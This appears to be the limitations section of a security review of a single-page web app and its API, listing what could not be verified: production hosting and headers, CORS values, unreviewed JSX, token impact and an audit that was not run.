- Production hosting of the SPA and of `/assets/uploads/**` (headers, CSP, framing, whether the API can even write into the front-end folder, or whether the API and SPA share a site for the `SameSite=Lax` cookie) is not in the repo: UNVERIFIABLE.
- `CORS_ALLOWED_ORIGINS` defaults to localhost values in `main.ts:43-46`; production value unknown.
- Did not review every page's JSX (about 34k LOC); a React-rendered string from the API is assumed escaped. Other `href`/`src` uses either use constants or `<Link to>`.
- The impact ceiling of a stolen/enrolled device token (SAW-02) belongs to the device/sync slices.
- `npm audit`/dependency CVE lookup not run (no network).
